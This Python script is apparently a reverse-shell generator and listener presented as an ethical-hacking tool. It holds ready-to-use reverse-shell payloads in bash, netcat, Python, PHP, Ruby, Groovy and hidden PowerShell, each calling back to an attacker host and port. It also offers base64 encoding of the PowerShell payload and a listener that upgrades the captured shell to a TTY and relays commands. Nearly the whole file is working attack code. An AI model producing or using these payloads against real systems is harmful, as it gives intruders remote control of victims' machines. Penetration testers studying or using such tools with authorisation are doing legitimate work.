#!/usr/bin/env python
import argparse
import base64
import socket
import sys
import time
from colorama import init, Fore
import os

init(autoreset=True)

# clear screen before running the tool
os.system("clear")

# Banner
line = "-" * 120
small_line = "-" * 53

print(line)
print(f"""
{Fore.RED}
██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗██████╗  █████╗ ███████╗████████╗
██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝
██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║     ██║     ██████╔╝███████║█████╗     ██║   
██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║     ██║     ██╔══██╗██╔══██║██╔══╝     ██║   
██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗╚██████╗██║  ██║██║  ██║██║        ██║   
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝   
""")
print(line)
print(f"{Fore.YELLOW} {small_line} About Author {small_line}")
print(f"\n{Fore.CYAN}--------------------- Kamlesh Kathiriya | Ethical Hacker & Penetration Tester | @KamleshKathiriya ----------------------")

payloads = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "nc": "nc -e /bin/sh {lhost} {lport}",
    "nc_openbsd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "python": 'python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")\"',
    "php": 'php -r \"$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");\"',
    "busybox": "busybox nc {lhost} {lport} -e /bin/bash",
    "ruby": 'ruby -rsocket -e\"f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\"',
    "groovy": (
        'String host="{lhost}";int port={lport};String cmd="sh";'
        'Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();'
        'Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();'
        'OutputStream po=p.getOutputStream(),so=s.getOutputStream();'
        'while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());'
        'while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);'
        'try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'
    ),
    "powershell": (
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        '$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});'
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
    ),
}

def listener(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print(f"[+] Listening on {ip}:{port}")
    conn, addr = s.accept()
    print(f"[+] Connection received from {addr[0]}:{addr[1]}")
    conn.settimeout(1.0)

    tty_payloads = [
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "perl -e 'exec \"/bin/bash\";'",
        "awk 'BEGIN {system(\"/bin/bash -i\")}'"
    ]

    shell_upgraded = False
    try:
        for payload in tty_payloads:
            print(f"{Fore.YELLOW}[*] Trying TTY upgrade with: {payload}")
            conn.send((payload + "\n").encode())
            time.sleep(1)
            conn.send(b"tty\n")
            time.sleep(1)
            try:
                data = conn.recv(1024).decode()
                if "not a tty" not in data.lower():
                    print(f"{Fore.GREEN}[+] Shell upgraded using: {payload}")
                    print(f"{Fore.GREEN}[+] Press Enter to drop into shell")
                    shell_upgraded = True
                    break
            except socket.timeout:
                pass
        if not shell_upgraded:
            print("{Fore.RED}[-] Failed to upgrade TTY shell using known methods.")

        while True:
            try:
                data = b""
                while True:
                    try:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                    except socket.timeout:
                        break
                if data:
                    try:
                        sys.stdout.write(data.decode())
                    except UnicodeDecodeError:
                        sys.stdout.write(data.decode(errors='replace'))
                command = input()
                if command.strip().lower() in ["exit", "quit"]:
                    print("[!] Exiting...")
                    break
                conn.send((command + "\n").encode())
            except KeyboardInterrupt:
                print("\n{Fore.RED}[!] Ctrl+C pressed. Closing connection.")
                break
    except Exception as e:
        print(f"{Fore.RED}[!] Exception: {e}")
    finally:
        conn.close()

def main():
    parser = argparse.ArgumentParser(description="Reverse Shell Generator")
    parser.add_argument("--lhost", required=True, help="Attacker IP")
    parser.add_argument("--lport", required=True, type=int, help="Attacker Port")
    parser.add_argument("--type", choices=payloads.keys(), required=True, help="Shell type")
    parser.add_argument("--listen", action="store_true", help="Start reverse shell listener")
    args = parser.parse_args()

    payload = payloads[args.type].format(lhost=args.lhost, lport=args.lport)
    print(f"{Fore.YELLOW}\n[+] Reverse Shell Payload ({args.type}):\n\n{Fore.BLUE}{payload}\n")

    if args.type == "powershell":
        encode = input("[?] Encode PowerShell payload (Y/N)? ").strip().lower()
        if encode == "y":
            b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
            print(f"{Fore.GREEN}\n[+] Encoded PowerShell: powershell -e {b64}\n")

    save = input("[?] Save payload to file (Y/N)? ").strip().lower()
    if save == "y":
        fname = input("Enter filename: ").strip()
        with open(fname, "w") as f:
            f.write(payload)
        print(f"{Fore.GREEN}[+] Payload saved to {fname}")

    if args.listen:
        print(f"\n{Fore.YELLOW}[+] Starting listener on {args.lhost}:{args.lport}...\n")
        listener(args.lhost, args.lport)

if __name__ == "__main__":
    main()
